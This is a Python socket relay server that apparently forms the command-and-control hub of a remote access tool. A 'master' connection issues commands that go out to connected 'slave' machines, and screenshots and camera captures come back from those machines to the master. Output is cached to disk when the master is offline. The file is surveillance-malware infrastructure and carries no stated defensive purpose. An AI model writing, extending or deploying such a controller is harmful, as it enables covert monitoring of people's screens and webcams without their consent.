import socket
import threading
import struct

clients = []

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind(('localhost',9999))
server.listen(socket.SOMAXCONN)
server.settimeout(5)
server.setblocking(True)


SCREENSHOT = False
CAMERA = False

def removeclient(client):
    if client in clients:
        clients.remove(client)


def clienthandler(client):
    global SCREENSHOT,CAMERA
    while True:
        if SCREENSHOT:
            SCREENSHOT = False
            datasize = int(client.recv(1024).decode())
            chunk = 1024
            data = b''
            while len(data) < datasize:
                data += client.recv(chunk)
            #
            data_size = len(data)
            master.send(f"{data_size}".encode())
            chunk = 1024
            offset = 0
            done = False
            while not done:
                master.send(data[offset:offset+chunk])
                if offset+chunk > data_size:
                    done = True
                offset += chunk
        elif CAMERA:
            CAMERA = False
            datasize = int(client.recv(1024).decode())
            chunk = 1024
            data = b''
            while len(data) < datasize:
                data += client.recv(chunk)
            #
            data_size = len(data)
            master.send(f"{data_size}".encode())
            chunk = 1024
            offset = 0
            done = False
            while not done:
                master.send(data[offset:offset+chunk])
                if offset+chunk > data_size:
                    done = True
                offset += chunk
        else:
            try:
                # get size of wanted data
                size = client.recv(1024)
                # get data
                data = client.recv(int(size.decode()))
                # send data to master
                try:
                    # send size
                    master.send(size)
                    # send data
                    master.send(data)
                except:
                    # master isnt connected
                    # so store in cache
                    with open("cache","a+") as f:
                        f.write(data)
            except:
                print("client offline")
                client.close()
                removeclient(client)
                break

def masterhandler():
    global SCREENSHOT, CAMERA
    while True:
        if not SCREENSHOT and not CAMERA:
            try:
                # get size of wanted data
                size = master.recv(1024)
                # get data
                data = master.recv(int(size.decode()))
                if data.decode() == "screenshot":
                    SCREENSHOT = True
                elif data.decode() == "camera capture":
                    CAMERA = True
                # send data to slave
                for slave in clients:
                    try:
                        slave.send(size)
                        slave.send(data)
                    except:
                        # slave offline
                        pass
            except:
                #maste offline
                print('master offline')
                break
        else:
            pass



while True:
    cli,addr = server.accept()
    tp = cli.recv(1024).decode()
    if tp == "master":
        master = cli
        threading.Thread(target=masterhandler).start()
        print("master connected!")

    else:
        clients.append(cli)
        threading.Thread(target=clienthandler,args=[cli]).start()
        print("client connected!")
    

    